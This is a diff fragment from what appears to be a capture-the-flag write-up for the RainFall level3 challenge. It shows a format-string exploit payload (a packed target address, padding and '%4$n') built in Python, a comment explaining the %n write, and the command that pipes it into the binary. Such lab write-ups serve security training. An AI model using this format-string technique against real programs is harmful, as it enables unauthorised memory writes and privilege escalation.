@@ -12,6 +12,7 @@ mAddr = struct.pack("I", 0x804988c)
 
 print mAddr+("a"*60)+"%4$n"
 
+i will use printf %n to write 64 to m
 
 level3@RainFall:~$ cat pl - | ./level3
 �aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
